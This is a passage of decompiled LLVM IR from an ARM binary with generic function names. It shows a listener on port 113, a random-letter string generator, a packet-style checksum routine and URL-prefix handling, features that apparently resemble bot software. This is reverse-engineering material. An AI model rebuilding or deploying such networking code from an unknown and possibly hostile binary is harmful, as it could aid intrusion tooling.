dec_label_pc_8578:                                ; preds = %dec_label_pc_8548
  %v2_857c = load i32, i32* @global_var_1847c.35, align 4
  %v7_8580 = icmp eq i32 %v2_857c, 1
  br i1 %v7_8580, label %dec_label_pc_8588, label %dec_label_pc_85a0

dec_label_pc_8588:                                ; preds = %dec_label_pc_8578
  %v2_8594 = call i32 @function_f5a8(i32 %v3_855c)
  br label %dec_label_pc_85e4

dec_label_pc_85a0:                                ; preds = %dec_label_pc_8578
  %v0_85a0 = call i32 @function_10364()
  %v2_85b0 = load i32, i32* @global_var_1847c.35, align 4
  %v2_85bc = call i32 @function_ca30(i32 %v0_85a0, i32 %v2_85b0)
  %v2_85cc = load i8*, i8** @global_var_18478.33, align 4
  %v3_85cc = ptrtoint i8* %v2_85cc to i32
  %v2_85d0 = add i32 %v2_85bc, 1
  %v1_85d4 = add i32 %v2_85d0, %v3_85cc
  %v1_85dc = call i32 @function_f5a8(i32 %v1_85d4)
  br label %dec_label_pc_85e4

dec_label_pc_85e4:                                ; preds = %dec_label_pc_8588, %dec_label_pc_8568, %dec_label_pc_85a0
  %v3_85e4 = phi i32 [ %v2_8594, %dec_label_pc_8588 ], [ %v0_8568, %dec_label_pc_8568 ], [ %v1_85dc, %dec_label_pc_85a0 ]
  ret i32 %v3_85e4

; uselistorder directives
  uselistorder i32 (i32)* @function_f5a8, { 1, 0 }
  uselistorder label %dec_label_pc_85e4, { 2, 0, 1 }
}

define i32 @function_85f8(i32 %arg1) local_unnamed_addr {
dec_label_pc_85f8:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_85f8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_85f8, i32* @ip, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  br label %dec_label_pc_8634

dec_label_pc_8610:                                ; preds = %dec_label_pc_865c, %dec_label_pc_8634
  %v3_8610 = phi i32 [ %v3_866c, %dec_label_pc_865c ], [ %v3_8644, %dec_label_pc_8634 ]
  store i32 %v3_8610, i32* @r0, align 4
  %v0_8614 = call i32 @function_f030()
  %v3_8620 = load i32, i32* %stack_var_-20, align 4
  %v2_8624 = add i32 %v0_8614, -1
  %v1_8628 = add i32 %v2_8624, %v3_8620
  %v3_8630 = inttoptr i32 %v1_8628 to i8*
  store i8 0, i8* %v3_8630, align 1
  %v3_8634.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_8634

dec_label_pc_8634:                                ; preds = %dec_label_pc_85f8, %dec_label_pc_8610
  %v3_8634 = phi i32 [ %arg1, %dec_label_pc_85f8 ], [ %v3_8634.pre, %dec_label_pc_8610 ]
  store i32 %v3_8634, i32* @r0, align 4
  %v0_8638 = call i32 @function_f030()
  %v3_8644 = load i32, i32* %stack_var_-20, align 4
  %v2_8648 = add i32 %v0_8638, -1
  %v1_864c = add i32 %v2_8648, %v3_8644
  %v1_8650 = inttoptr i32 %v1_864c to i8*
  %v2_8650 = load i8, i8* %v1_8650, align 1
  %v7_8654 = icmp eq i8 %v2_8650, 13
  br i1 %v7_8654, label %dec_label_pc_8610, label %dec_label_pc_865c

dec_label_pc_865c:                                ; preds = %dec_label_pc_8634
  store i32 %v3_8644, i32* @r0, align 4
  %v0_8660 = call i32 @function_f030()
  %v3_866c = load i32, i32* %stack_var_-20, align 4
  %v2_8670 = add i32 %v0_8660, -1
  %v1_8674 = add i32 %v2_8670, %v3_866c
  %v1_8678 = inttoptr i32 %v1_8674 to i8*
  %v2_8678 = load i8, i8* %v1_8678, align 1
  %v7_867c = icmp eq i8 %v2_8678, 10
  br i1 %v7_867c, label %dec_label_pc_8610, label %dec_label_pc_8684

dec_label_pc_8684:                                ; preds = %dec_label_pc_865c
  ret i32 %v0_8660

; uselistorder directives
  uselistorder i32 %v3_866c, { 1, 0 }
  uselistorder i32 %v3_8644, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_8634, { 1, 0 }
}

define i32 @function_8688() local_unnamed_addr {
dec_label_pc_8688:
  %stack_var_-1064 = alloca i32, align 4
  %v3_868c = load i32, i32* @r4, align 4
  %v6_868c = load i32, i32* @fp, align 4
  %v2_8698 = ptrtoint i32* %stack_var_-1064 to i32
  %v0_869c = call i32 @function_10364()
  %v2_86ac = call i32 @function_cafc(i32 %v0_869c, i32 5)
  %v1_86b4 = add i32 %v2_86ac, 4
  %v1_86c0 = add i32 %v2_86ac, 5
  %v1_86c8 = call i32 @function_fc78(i32 %v1_86c0)
  store i32 %v1_86c0, i32* @r2, align 4
  %v2_86ec = inttoptr i32 %v1_86c8 to i8*
  %v3_86ec = call i32 @function_ef70(i8* %v2_86ec, i32 0)
  store i32 ptrtoint ([16 x i8]* @global_var_15060.37 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_15070.39 to i32), i32* @r1, align 4
  %v3_86f8 = call i32 @function_d050(i32 ptrtoint ([16 x i8]* @global_var_15060.37 to i32), i32 ptrtoint (i32* @global_var_15070.39 to i32))
  %v2_8708 = icmp eq i32 %v3_86f8, 0
  br i1 %v2_8708, label %dec_label_pc_8760.preheader, label %dec_label_pc_8774

dec_label_pc_8760.preheader:                      ; preds = %dec_label_pc_8688
  %v5_876c22 = icmp sgt i32 %v1_86b4, 0
  br i1 %v5_876c22, label %dec_label_pc_871c, label %dec_label_pc_8850

dec_label_pc_871c:                                ; preds = %dec_label_pc_8760.preheader, %dec_label_pc_871c
  %storemerge323 = phi i32 [ %v1_8758, %dec_label_pc_871c ], [ 0, %dec_label_pc_8760.preheader ]
  %v2_8728 = add i32 %storemerge323, %v1_86c8
  store i32 %v2_8728, i32* @r4, align 4
  %v0_872c = call i32 @function_10364()
  %v2_873c = call i32 @function_cafc(i32 %v0_872c, i32 26)
  %fold = add i32 %v2_873c, 65
  %v1_8750 = trunc i32 %fold to i8
  %v2_8750 = load i32, i32* @r4, align 4
  %v3_8750 = inttoptr i32 %v2_8750 to i8*
  store i8 %v1_8750, i8* %v3_8750, align 1
  %v1_8758 = add nuw nsw i32 %storemerge323, 1
  %v5_876c = icmp slt i32 %v1_8758, %v1_86b4
  br i1 %v5_876c, label %dec_label_pc_871c, label %dec_label_pc_8850

dec_label_pc_8774:                                ; preds = %dec_label_pc_8688
  %v0_8774 = call i32 @function_10364()
  store i32 %v0_8774, i32* @r4, align 4
  %v0_877c = call i32 @function_10364()
  %v0_8784 = load i32, i32* @r4, align 4
  %v2_8784 = mul i32 %v0_8784, %v0_877c
  %v2_8794 = call i32 @function_cafc(i32 %v2_8784, i32 45402)
  %v1_879c = add i32 %v2_8794, 1
  %v5_87e030 = icmp sgt i32 %v1_879c, 0
  br i1 %v5_87e030, label %dec_label_pc_87b0, label %dec_label_pc_87e4

dec_label_pc_87b0:                                ; preds = %dec_label_pc_8774, %dec_label_pc_87b0
  %storemerge231 = phi i32 [ %v1_87cc, %dec_label_pc_87b0 ], [ 0, %dec_label_pc_8774 ]
  %v3_87c4 = call i32 @function_e7bc(i32 %v2_8698, i32 1024, i32 %v3_86f8)
  %v1_87cc = add nuw nsw i32 %storemerge231, 1
  %v5_87e0 = icmp slt i32 %v1_87cc, %v1_879c
  br i1 %v5_87e0, label %dec_label_pc_87b0, label %dec_label_pc_87e4

dec_label_pc_87e4:                                ; preds = %dec_label_pc_87b0, %dec_label_pc_8774
  store i32 1024, i32* @r2, align 4
  %v2_87f8 = bitcast i32* %stack_var_-1064 to i8*
  %v3_87f8 = call i32 @function_ef70(i8* %v2_87f8, i32 0)
  %v3_8810 = call i32 @function_e7bc(i32 %v2_8698, i32 1024, i32 %v3_86f8)
  %v1_8820 = call i32 @function_85f8(i32 %v2_8698)
  store i32 %v1_86c8, i32* @r0, align 4
  store i32 %v2_8698, i32* @r1, align 4
  store i32 %v1_86b4, i32* @r2, align 4
  %v0_8844 = call i32 @function_ef60()
  %v1_884c = inttoptr i32 %v3_86f8 to i8*
  %v2_884c = call i32 @function_ced0(i8* %v1_884c)
  br label %dec_label_pc_8850

dec_label_pc_8850:                                ; preds = %dec_label_pc_8760.preheader, %dec_label_pc_871c, %dec_label_pc_87e4
  store i32 %v3_868c, i32* @r4, align 4
  store i32 %v6_868c, i32* @fp, align 4
  ret i32 %v1_86c8

; uselistorder directives
  uselistorder i32 %v1_87cc, { 1, 0 }
  uselistorder i32 %v1_879c, { 1, 0 }
  uselistorder i32 %v1_8758, { 1, 0 }
  uselistorder i32 %v1_86c8, { 2, 1, 0, 3 }
  uselistorder i32 %v1_86b4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8850, { 2, 1, 0 }
  uselistorder label %dec_label_pc_87b0, { 1, 0 }
  uselistorder label %dec_label_pc_871c, { 1, 0 }
}

define i32 @function_8868(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8868:
  %stack_var_-1100 = alloca i32, align 4
  %stack_var_-1108 = alloca i32, align 4
  %stack_var_-1236 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_886c = load i32, i32* @fp, align 4
  store i32 %v3_886c, i32* %stack_var_-16, align 4
  store i32 34932, i32* %stack_var_-4, align 4
  %v13_886c = ptrtoint i32* %stack_var_-16 to i32
  %v2_8870 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8870, i32* @fp, align 4
  %v3_8888 = call i32 @function_fc4c(i32 2, i32 1, i32 0)
  %v7_8898 = icmp eq i32 %v3_8888, -1
  br i1 %v7_8898, label %dec_label_pc_8c38, label %dec_label_pc_88a0

dec_label_pc_88a0:                                ; preds = %dec_label_pc_8868
  store i32 2, i32* %stack_var_-60, align 4
  %v1_88b4 = call i32 @function_f604(i32 113)
  %sext = mul i32 %v1_88b4, 16777216
  %v1_88b8 = sdiv i32 %sext, 16777216
  %v2_88d0 = ptrtoint i32* %stack_var_-60 to i32
  %v10_88f8 = ashr i32 %sext, 31
  %v11_88f8 = bitcast i32* %stack_var_-60 to %sockaddr*
  %v12_88f8 = call i32 @function_fb38(i32 %v3_8888, %sockaddr* %v11_88f8, i32 16, i32 %v2_88d0, i32 %v1_88b8, i32 %v10_88f8, i32 0, i32 0, i32 0)
  %v7_8900 = icmp eq i32 %v12_88f8, -1
  br i1 %v7_8900, label %dec_label_pc_8c38, label %dec_label_pc_8908

dec_label_pc_8908:                                ; preds = %dec_label_pc_88a0
  %v2_8910 = call i32 @function_fb90(i32 %v3_8888, i32 1)
  %v7_8918 = icmp eq i32 %v2_8910, -1
  br i1 %v7_8918, label %dec_label_pc_8c38, label %dec_label_pc_8920

dec_label_pc_8920:                                ; preds = %dec_label_pc_8908
  %v0_8920 = call i32 @function_cc10()
  %v2_8928 = icmp eq i32 %v0_8920, 0
  br i1 %v2_8928, label %dec_label_pc_8c38, label %dec_label_pc_8930

dec_label_pc_8930:                                ; preds = %dec_label_pc_8920
  store i32 16, i32* %stack_var_-44, align 4
  %v2_8938 = ptrtoint i32* %stack_var_-76 to i32
  %v2_893c = ptrtoint i32* %stack_var_-44 to i32
  %v5_8948 = bitcast i32* %stack_var_-76 to %sockaddr*
  %v6_8948 = call i32 @function_fb0c(i32 %v3_8888, %sockaddr* %v5_8948, i32 %v2_893c, i32 %v2_8938, i32 16)
  %v2_8958 = add i32 %v6_8948, 1
  %v3_8958 = icmp eq i32 %v6_8948, -1
  br i1 %v3_8958, label %dec_label_pc_8960, label %dec_label_pc_8968.preheader

dec_label_pc_8960:                                ; preds = %dec_label_pc_8930
  %v1_8964 = call i32 @function_10a14(i32 0)
  br label %dec_label_pc_8968.preheader

dec_label_pc_8968.preheader:                      ; preds = %dec_label_pc_8960, %dec_label_pc_8930
  %v2_8970 = ptrtoint i32* %stack_var_-1236 to i32
  %v3_89b0 = udiv i32 %v6_8948, 32
  %v3_89c4 = mul nuw nsw i32 %v3_89b0, 4
  %v2_89cc = add i32 %v3_89c4, %v13_886c
  %v1_89dc = urem i32 %v6_8948, 32
  %v6_89e4 = shl i32 1, %v1_89dc
  %v2_8a34 = ptrtoint i32* %stack_var_-1108 to i32
  %v2_8a80 = add i32 %v2_89cc, -1220
  %v1_8a84 = inttoptr i32 %v2_8a80 to i32*
  br label %dec_label_pc_8984.lr.ph

dec_label_pc_8984.lr.ph:                          ; preds = %dec_label_pc_8a64, %dec_label_pc_8968.preheader
  br label %dec_label_pc_8984

dec_label_pc_8984:                                ; preds = %dec_label_pc_8984.lr.ph, %dec_label_pc_8984
  %storemerge28 = phi i32 [ 0, %dec_label_pc_8984.lr.ph ], [ %v1_8998, %dec_label_pc_8984 ]
  %v5_8990 = mul nuw nsw i32 %storemerge28, 4
  %v6_8990 = add i32 %v5_8990, %v2_8970
  %v7_8990 = inttoptr i32 %v6_8990 to i32*
  store i32 0, i32* %v7_8990, align 4
  %v1_8998 = add nuw nsw i32 %storemerge28, 1
  %tmp38 = icmp ult i32 %v1_8998, 32
  br i1 %tmp38, label %dec_label_pc_8984, label %dec_label_pc_89ac

dec_label_pc_89ac:                                ; preds = %dec_label_pc_8984
  %v2_89d4 = load i32, i32* %v1_8a84, align 4
  %v2_89e8 = or i32 %v2_89d4, %v6_89e4
  store i32 %v2_89e8, i32* %v1_8a84, align 4
  store i32 60, i32* %stack_var_-1108, align 4
  %v5_8a4c = call i32 @function_ce00(i32 %v2_8958, i32 %v2_8970, i32 0, i32 0, i32 %v2_8a34)
  %v1_8a54 = icmp slt i32 %v5_8a4c, 0
  br i1 %v1_8a54, label %dec_label_pc_8a5c, label %dec_label_pc_8a64

dec_label_pc_8a5c:                                ; preds = %dec_label_pc_89ac
  %v1_8a60 = call i32 @function_10a14(i32 0)
  br label %dec_label_pc_8a64

dec_label_pc_8a64:                                ; preds = %dec_label_pc_89ac, %dec_label_pc_8a5c
  %v2_8a84 = load i32, i32* %v1_8a84, align 4
  %v6_8a901 = lshr i32 %v2_8a84, %v1_89dc
  %v1_8a98 = urem i32 %v6_8a901, 2
  %v2_8a9c = icmp eq i32 %v1_8a98, 0
  br i1 %v2_8a9c, label %dec_label_pc_8984.lr.ph, label %dec_label_pc_8aa8

dec_label_pc_8aa8:                                ; preds = %dec_label_pc_8a64
  %v2_8ab0 = ptrtoint i32* %stack_var_-1100 to i32
  %v5_8ac4 = call i32 @function_fbbc(i32 %v6_8948, i32* nonnull %stack_var_-1100, i32 1024, i32 0)
  %tmp39 = icmp slt i32 %v5_8ac4, 1
  br i1 %tmp39, label %dec_label_pc_8ae8, label %dec_label_pc_8adc

dec_label_pc_8adc:                                ; preds = %dec_label_pc_8aa8
  %v7_8ae4 = icmp slt i32 %v5_8ac4, 20
  br i1 %v7_8ae4, label %dec_label_pc_8af0, label %dec_label_pc_8ae8

dec_label_pc_8ae8:                                ; preds = %dec_label_pc_8adc, %dec_label_pc_8aa8
  %v1_8aec = call i32 @function_10a14(i32 0)
  br label %dec_label_pc_8af0

dec_label_pc_8af0:                                ; preds = %dec_label_pc_8adc, %dec_label_pc_8ae8
  %v2_8b00 = add i32 %v13_886c, -1084
  %v2_8b04 = add i32 %v2_8b00, %v5_8ac4
  %v3_8b0c = inttoptr i32 %v2_8b04 to i8*
  store i8 0, i8* %v3_8b0c, align 1
  %v1_8b14 = add i32 %v13_886c, -1
  %v2_8b24 = add i32 %v1_8b14, %v5_8ac4
  %v2_8b28 = add i32 %v2_8b24, -1084
  %v1_8b2c = inttoptr i32 %v2_8b28 to i8*
  %v2_8b2c = load i8, i8* %v1_8b2c, align 1
  %v7_8b30 = icmp eq i8 %v2_8b2c, 10
  br i1 %v7_8b30, label %dec_label_pc_8b60, label %dec_label_pc_8b38

dec_label_pc_8b38:                                ; preds = %dec_label_pc_8af0
  %v2_8b54 = load i8, i8* %v1_8b2c, align 1
  %v7_8b58 = icmp eq i8 %v2_8b54, 13
  br i1 %v7_8b58, label %dec_label_pc_8b60, label %dec_label_pc_8b84

dec_label_pc_8b60:                                ; preds = %dec_label_pc_8b38, %dec_label_pc_8af0
  store i8 0, i8* %v1_8b2c, align 1
  br label %dec_label_pc_8b84

dec_label_pc_8b84:                                ; preds = %dec_label_pc_8b38, %dec_label_pc_8b60
  %v1_8b88 = add i32 %v13_886c, -2
  %v2_8b98 = add i32 %v1_8b88, %v5_8ac4
  %v2_8b9c = add i32 %v2_8b98, -1084
  %v1_8ba0 = inttoptr i32 %v2_8b9c to i8*
  %v2_8ba0 = load i8, i8* %v1_8ba0, align 1
  %v7_8ba4 = icmp eq i8 %v2_8ba0, 10
  br i1 %v7_8ba4, label %dec_label_pc_8bd4, label %dec_label_pc_8bac

dec_label_pc_8bac:                                ; preds = %dec_label_pc_8b84
  %v2_8bc8 = load i8, i8* %v1_8ba0, align 1
  %v7_8bcc = icmp eq i8 %v2_8bc8, 13
  br i1 %v7_8bcc, label %dec_label_pc_8bd4, label %dec_label_pc_8bf8

dec_label_pc_8bd4:                                ; preds = %dec_label_pc_8bac, %dec_label_pc_8b84
  store i8 0, i8* %v1_8ba0, align 1
  br label %dec_label_pc_8bf8

dec_label_pc_8bf8:                                ; preds = %dec_label_pc_8bac, %dec_label_pc_8bd4
  store i32 %v2_8ab0, i32* @r2, align 4
  %v3_8c1c = call i32 @function_8374(i32 %v6_8948, i32 ptrtoint ([25 x i8]* @global_var_15074.43 to i32))
  %v1_8c24 = call i32 @function_cbe4(i32 %v6_8948)
  %v1_8c2c = call i32 @function_cbe4(i32 %v3_8888)
  %v1_8c34 = call i32 @function_10a14(i32 0)
  br label %dec_label_pc_8c38

dec_label_pc_8c38:                                ; preds = %dec_label_pc_8920, %dec_label_pc_8908, %dec_label_pc_88a0, %dec_label_pc_8868, %dec_label_pc_8bf8
  %v9_8c3c = phi i32 [ 0, %dec_label_pc_8920 ], [ %v2_8910, %dec_label_pc_8908 ], [ %v12_88f8, %dec_label_pc_88a0 ], [ %v3_8888, %dec_label_pc_8868 ], [ %v1_8c34, %dec_label_pc_8bf8 ]
  ret i32 %v9_8c3c

; uselistorder directives
  uselistorder i8* %v1_8ba0, { 1, 0, 2 }
  uselistorder i8* %v1_8b2c, { 1, 0, 2 }
  uselistorder i32 %storemerge28, { 1, 0 }
  uselistorder i32* %v1_8a84, { 2, 0, 1 }
  uselistorder i32 %v1_89dc, { 1, 0 }
  uselistorder i32 %v2_8970, { 1, 0 }
  uselistorder i32 %v6_8948, { 2, 3, 4, 1, 0, 6, 5 }
  uselistorder i32 %v2_8910, { 1, 0 }
  uselistorder i32 %v12_88f8, { 1, 0 }
  uselistorder i32 %v3_8888, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v13_886c, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 0, 2, 1 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder label %dec_label_pc_8c38, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8bf8, { 1, 0 }
  uselistorder label %dec_label_pc_8b84, { 1, 0 }
  uselistorder label %dec_label_pc_8af0, { 1, 0 }
  uselistorder label %dec_label_pc_8a64, { 1, 0 }
  uselistorder label %dec_label_pc_8984, { 1, 0 }
}

define i32 @function_8c48(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8c48:
  %stack_var_-4 = alloca i32, align 4
  store i32 35924, i32* %stack_var_-4, align 4
  %v2_8c50 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8c50, i32* @fp, align 4
  %v2_8c64 = icmp eq i32 %arg2, 0
  br i1 %v2_8c64, label %dec_label_pc_8c6c, label %dec_label_pc_8c78

dec_label_pc_8c6c:                                ; preds = %dec_label_pc_8c48
  br label %dec_label_pc_8cb4

dec_label_pc_8c78:                                ; preds = %dec_label_pc_8c48
  %v7_8c7c = icmp eq i32 %arg2, 1
  br i1 %v7_8c7c, label %dec_label_pc_8c84, label %dec_label_pc_8c90

dec_label_pc_8c84:                                ; preds = %dec_label_pc_8c78
  br label %dec_label_pc_8cb4

dec_label_pc_8c90:                                ; preds = %dec_label_pc_8c78
  %v1_8c7c = add i32 %arg2, -1
  %v2_8ca0 = call i32 @function_8c48(i32 %arg1, i32 %v1_8c7c)
  %v2_8cac = mul i32 %v2_8ca0, %arg1
  br label %dec_label_pc_8cb4

dec_label_pc_8cb4:                                ; preds = %dec_label_pc_8c84, %dec_label_pc_8c6c, %dec_label_pc_8c90
  %v3_8cb4 = phi i32 [ %arg1, %dec_label_pc_8c84 ], [ 1, %dec_label_pc_8c6c ], [ %v2_8cac, %dec_label_pc_8c90 ]
  ret i32 %v3_8cb4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8cb4, { 2, 0, 1 }
}

define i32 @function_8cc4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8cc4:
  %v8_8d4011 = icmp sgt i32 %arg2, 1
  br i1 %v8_8d4011, label %dec_label_pc_8d04, label %dec_label_pc_8d44

dec_label_pc_8d04:                                ; preds = %dec_label_pc_8cc4, %dec_label_pc_8d04
  %v3_8d2c = phi i32 [ %v1_8d30, %dec_label_pc_8d04 ], [ %arg2, %dec_label_pc_8cc4 ]
  %stack_var_-36.013 = phi i8* [ %v5_8d28, %dec_label_pc_8d04 ], [ %arg1, %dec_label_pc_8cc4 ]
  %stack_var_-32.012 = phi i32 [ %v2_8d18, %dec_label_pc_8d04 ], [ 0, %dec_label_pc_8cc4 ]
  %v4_8d04 = ptrtoint i8* %stack_var_-36.013 to i32
  %v2_8d08 = load i8, i8* %stack_var_-36.013, align 1
  %v3_8d08 = zext i8 %v2_8d08 to i32
  %v1_8d0c = add i32 %v4_8d04, 1
  %v2_8d0c = inttoptr i32 %v1_8d0c to i8*
  %v3_8d0c = load i8, i8* %v2_8d0c, align 1
  %v4_8d0c = zext i8 %v3_8d0c to i32
  %v4_8d10 = mul nuw nsw i32 %v4_8d0c, 256
  %v5_8d10 = or i32 %v4_8d10, %v3_8d08
  %v2_8d18 = add i32 %v5_8d10, %stack_var_-32.012
  %v1_8d24 = add i32 %v4_8d04, 2
  %v5_8d28 = inttoptr i32 %v1_8d24 to i8*
  %v1_8d30 = add nsw i32 %v3_8d2c, -2
  %v8_8d40 = icmp sgt i32 %v1_8d30, 1
  br i1 %v8_8d40, label %dec_label_pc_8d04, label %dec_label_pc_8d44

dec_label_pc_8d44:                                ; preds = %dec_label_pc_8d04, %dec_label_pc_8cc4
  %v3_8d44 = phi i32 [ %arg2, %dec_label_pc_8cc4 ], [ %v1_8d30, %dec_label_pc_8d04 ]
  %stack_var_-32.0.lcssa = phi i32 [ 0, %dec_label_pc_8cc4 ], [ %v2_8d18, %dec_label_pc_8d04 ]
  %stack_var_-36.0.lcssa = phi i8* [ %arg1, %dec_label_pc_8cc4 ], [ %v5_8d28, %dec_label_pc_8d04 ]
  %v7_8d48 = icmp eq i32 %v3_8d44, 1
  br i1 %v7_8d48, label %dec_label_pc_8d50, label %dec_label_pc_8d7c

dec_label_pc_8d50:                                ; preds = %dec_label_pc_8d44
  %v2_8d58 = load i8, i8* %stack_var_-36.0.lcssa, align 1
  %v3_8d64 = sext i8 %v2_8d58 to i32
  %v2_8d74 = add i32 %v3_8d64, %stack_var_-32.0.lcssa
  br label %dec_label_pc_8d7c

dec_label_pc_8d7c:                                ; preds = %dec_label_pc_8d44, %dec_label_pc_8d50
  %stack_var_-32.1 = phi i32 [ %v2_8d74, %dec_label_pc_8d50 ], [ %stack_var_-32.0.lcssa, %dec_label_pc_8d44 ]
  %v3_8d80 = sdiv i32 %stack_var_-32.1, 65536
  %v3_8d8c = urem i32 %stack_var_-32.1, 65536
  %v2_8d90 = add nsw i32 %v3_8d80, %v3_8d8c
  %v3_8d9c = sdiv i32 %v2_8d90, 65536
  %v2_8da4 = add nsw i32 %v3_8d9c, %v2_8d90
  %v2_8da4.not = or i32 %v2_8da4, -65536
  %v1_8db8 = xor i32 %v2_8da4.not, 65535
  %v3_8dd03 = and i32 %v1_8db8, 65280
  %sext = mul i32 %v1_8db8, 16777216
  %v3_8ddc = sdiv i32 %sext, 16777216
  %v5_8de4 = or i32 %v3_8ddc, %v3_8dd03
  ret i32 %v5_8de4

; uselistorder directives
  uselistorder i32 %v2_8d90, { 1, 0 }
  uselistorder i32 %stack_var_-32.1, { 1, 0 }
  uselistorder i32 %stack_var_-32.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_8d30, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8d7c, { 1, 0 }
  uselistorder label %dec_label_pc_8d04, { 1, 0 }
}

define i32 @function_8df4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8df4:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-5200 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-1104 = alloca i32, align 4
  %stack_var_-5216 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_8df8 = load i32, i32* @r4, align 4
  store i32 %v3_8df8, i32* %stack_var_-20, align 4
  store i32 36352, i32* %stack_var_-4, align 4
  %v16_8df8 = ptrtoint i32* %stack_var_-20 to i32
  %v2_8dfc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8dfc, i32* @fp, align 4
  %v3_8e14 = add i32 %v16_8df8, -5184
  %v4_8e14 = inttoptr i32 %v3_8e14 to i32*
  store i32 %arg1, i32* %v4_8e14, align 4
  store i32 %v16_8df8, i32* @lr, align 4
  store i32 %arg4, i32* %stack_var_-5216, align 4
  store i32 %v16_8df8, i32* %r1.global-to-local, align 4
  %v1_8e58 = call i32 @function_83d8(i32 %arg2)
  %v2_8e60 = icmp eq i32 %v1_8e58, 0
  br i1 %v2_8e60, label %dec_label_pc_8e68, label %dec_label_pc_9530

dec_label_pc_8e68:                                ; preds = %dec_label_pc_8df4
  %v8_8e7c = icmp sgt i32 %arg3, 1
  br i1 %v8_8e7c, label %dec_label_pc_8eb0, label %dec_label_pc_8e80

dec_label_pc_8e80:                                ; preds = %dec_label_pc_8e68
  %v4_8e94 = load i32, i32* %v4_8e14, align 4
  store i32 ptrtoint ([33 x i8]* @global_var_15090.45 to i32), i32* %r1.global-to-local, align 4
  store i32 %v16_8df8, i32* @lr, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_8ea4 = call i32 @function_8374(i32 %v4_8e94, i32 ptrtoint ([33 x i8]* @global_var_15090.45 to i32))
  %v1_8eac = call i32 @function_10a14(i32 0)
  br label %dec_label_pc_8eb0

dec_label_pc_8eb0:                                ; preds = %dec_label_pc_8e68, %dec_label_pc_8e80
  store i32 1, i32* %r1.global-to-local, align 4
  %v3_8ebc = call i32 @function_fc4c(i32 2, i32 1, i32 0)
  %v3_8ecc = icmp eq i32 %v3_8ebc, -1
  br i1 %v3_8ecc, label %dec_label_pc_8ed4, label %dec_label_pc_8f04

dec_label_pc_8ed4:                                ; preds = %dec_label_pc_8eb0
  store i32 %v16_8df8, i32* %r1.global-to-local, align 4
  %v4_8ee8 = load i32, i32* %v4_8e14, align 4
  store i32 ptrtoint ([37 x i8]* @global_var_150b4.47 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_8ef8 = call i32 @function_8374(i32 %v4_8ee8, i32 ptrtoint ([37 x i8]* @global_var_150b4.47 to i32))
  %v1_8f00 = call i32 @function_10a14(i32 0)
  br label %dec_label_pc_8f04

dec_label_pc_8f04:                                ; preds = %dec_label_pc_8eb0, %dec_label_pc_8ed4
  %v4_8f10 = load i32, i32* %stack_var_-5216, align 4
  %v1_8f14 = add i32 %v4_8f10, 4
  %v1_8f18 = inttoptr i32 %v1_8f14 to i32*
  %v2_8f18 = load i32, i32* %v1_8f18, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_150dc.49 to i32), i32* @r1, align 4
  %v4_8f28 = inttoptr i32 %v2_8f18 to i8*
  %v5_8f28 = call i32 @function_f0ac(i8* %v4_8f28, i32 ptrtoint ([8 x i8]* @global_var_150dc.49 to i32), i32 7)
  %v2_8f30 = icmp eq i32 %v5_8f28, 0
  br i1 %v2_8f30, label %dec_label_pc_8f38, label %dec_label_pc_8f6c

dec_label_pc_8f38:                                ; preds = %dec_label_pc_8f04
  store i32 %v16_8df8, i32* @lr, align 4
  %v4_8f44 = load i32, i32* %stack_var_-5216, align 4
  %v1_8f48 = add i32 %v4_8f44, 4
  %v1_8f4c = inttoptr i32 %v1_8f48 to i32*
  %v2_8f4c = load i32, i32* %v1_8f4c, align 4
  %v1_8f50 = add i32 %v2_8f4c, 7
  %v2_8f58 = ptrtoint i32* %stack_var_-1104 to i32
  store i32 %v1_8f50, i32* %r1.global-to-local, align 4
  %v2_8f64 = inttoptr i32 %v1_8f50 to i8*
  %v3_8f64 = call i32 @function_f090(i32 %v2_8f58, i8* %v2_8f64)
  br label %dec_label_pc_8f98

dec_label_pc_8f6c:                                ; preds = %dec_label_pc_8f04
  %v4_8f78 = load i32, i32* %stack_var_-5216, align 4
  %v1_8f7c = add i32 %v4_8f78, 4
  %v1_8f80 = inttoptr i32 %v1_8f7c to i32*
  %v2_8f80 = load i32, i32* %v1_8f80, align 4
  %v2_8f88 = ptrtoint i32* %stack_var_-1104 to i32
